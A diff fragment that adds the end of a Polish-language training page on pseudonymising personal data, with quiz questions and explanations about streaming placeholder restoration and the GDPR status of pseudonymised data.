+  <p class="explain">Granice fragmentów wyznacza tokenizer modelu. <code>StreamingRestorer</code> wstrzymuje niedomknięty znacznik (do ograniczonej długości) i odtwarza go po domknięciu. Mapowanie nigdy nie trafia do przeglądarki.</p>
+</div>
+<div class="quiz" data-id="q5" data-correct="2">
+  <p class="q">Które stwierdzenie o danych po pseudonimizacji jest prawdziwe?</p>
+  <button>Po zamianie na znaczniki dane przestają być danymi osobowymi, więc umowa powierzenia nie jest potrzebna</button>
+  <button>Pseudonimizacja to to samo co anonimizacja</button>
+  <button>Nadal są danymi osobowymi w rozumieniu RODO; pseudonimizacja zmniejsza ryzyko, ale nie zdejmuje obowiązków</button>
+  <button>Pseudonimizacja jest wymagana tylko dla PESEL-u</button>
+  <p class="explain">Dane pseudonimizowane da się przypisać osobie przy użyciu dodatkowych informacji, więc RODO traktuje je jako osobowe. Tekst po redakcji często nadal identyfikuje osobę z kontekstu.</p>
+</div>
+</main>
+<script src="../assets/highlight.min.js"></script>
+<script src="../assets/course.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
